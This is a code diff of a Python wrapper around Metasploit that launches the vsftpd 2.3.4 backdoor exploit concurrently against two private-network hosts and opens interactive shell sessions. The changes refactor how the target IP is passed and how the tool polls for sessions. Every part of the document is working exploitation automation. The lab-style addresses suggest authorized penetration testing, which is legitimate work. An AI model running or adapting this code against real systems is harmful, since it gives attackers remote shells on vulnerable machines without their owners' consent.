@@ -266,7 +266,7 @@ class Console:
         target2.set_payload("exploit","exploit/unix/ftp/vsftpd_234_backdoor")
         target1.set_arguments({"RHOSTS":"192.168.17.130"})
         target2.set_arguments({"RHOSTS":"192.168.17.131"})
-        await asyncio.gather(target1.run_payload(), target2.run_payload())
+        await asyncio.gather(target1.run_payload("cmd/unix/interact"), target2.run_payload("cmd/unix/interact"))
         # await self.run_payloads(targets)
 
 class Target:
@@ -288,20 +288,20 @@ class Target:
         for argument in arguments.keys():
             self.exploit[argument] = arguments[argument]
 
-    async def run_payload(self, shell_path, ip):
+    async def run_payload(self, shell_path):
         if self.exploit is None: return
-        is_exploited, session_id = self.console.is_exploited(ip)
+        is_exploited, session_id = self.console.is_exploited(self.ip)
         if is_exploited:
-            logging.warning(f"target {ip} already has a session; session_id -> {session_id} ")
+            logging.warning(f"target {self.ip} already has a session; session_id -> {session_id} ")
             return session_id
 
         exploit_result = self.exploit.execute(payload=shell_path)
         self.exploit_result = exploit_result
-        exploit_result["ip"] = ip
+        exploit_result["ip"] = self.ip
         completed = False
         while not completed:
             logging.debug(f"checking status for job -> {exploit_result['job_id']}")
-            completed, session_id = await self.is_job_completed(ip)
+            completed, session_id = await self.is_job_completed(self.ip)
             await asyncio.sleep(1)
 
         if exploit_result["job_id"] == None or session_id == None:
